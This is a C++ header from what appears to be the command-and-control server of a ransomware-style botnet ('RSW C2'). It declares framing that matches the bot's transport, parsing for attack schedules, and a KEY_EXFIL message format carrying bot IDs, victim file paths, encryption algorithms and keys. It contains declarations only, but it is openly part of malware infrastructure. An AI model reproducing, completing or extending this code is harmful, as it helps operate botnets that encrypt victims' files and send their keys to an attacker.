/*
 * rsw_protocol.h — Stateless protocol/parse layer for RSW C2 server.
 *
 * SPLIT ORIGIN: extracted from RSW.cpp's RSW_C2 god class. Everything here
 * is free of class state → independently unit-testable (see tests/).
 *
 * Covers:
 *   - string helpers (trim, formatTime, centerText)
 *   - hex encode/decode
 *   - transport framing (wrap/unwrap: 4B BE length + XOR checksum)
 *   - schedule parsing (HH:MM, interval form)
 *   - KEY_EXFIL payload parsing ('|'-separated; Windows paths contain ':')
 */
#ifndef RSW_PROTOCOL_H
#define RSW_PROTOCOL_H

#include <string>
#include <ctime>

namespace rsw {

// ---- string helpers ----
std::string trim(const std::string& text);
std::string formatTime(std::time_t timestamp);          // "5m ago" style
std::string centerText(const std::string& text, int width);

// ---- hex codec ----
std::string bytesToHex(const std::string& data);
std::string hexToBytes(const std::string& hex);

// ---- transport framing (matches bot's sendFrame/unwrap) ----
std::string wrapForTransport(const std::string& data);   // len(4B BE) || xorcksum(1B) || data
std::string unwrapFromTransport(const std::string& data); // returns input unchanged on error

// ---- schedule parsing ----
// Returns 0 on invalid input ("*/0", negative, bad HH:MM, garbage).
std::time_t parseScheduleTime(const std::string& schedule_str);

// ---- KEY_EXFIL parsing ----
// Format: KEY_EXFIL:bot_id|file_path|algo|key
// '|' not ':' — Windows paths (C:\...) contain colons.
struct KeyExfil {
    bool valid = false;
    std::string bot_id;
    std::string file_path;
    std::string algo;
    std::string key;
};
KeyExfil parseKeyExfil(const std::string& message);      // accepts full "KEY_EXFIL:..." message

} // namespace rsw

#endif // RSW_PROTOCOL_H
